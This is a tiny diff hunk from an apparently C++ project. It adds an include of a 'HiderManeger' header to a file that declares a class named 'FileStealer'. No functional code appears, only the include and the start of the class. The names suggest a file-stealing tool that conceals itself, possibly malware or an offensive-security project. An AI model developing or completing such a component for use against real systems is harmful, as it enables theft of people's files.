@@ -8,6 +8,7 @@
 #include <map>
 
 #include "Contraption.h"
+#include "../Maneger/HiderManeger.h"
 
 class FileStealer : Contraption {
 private:
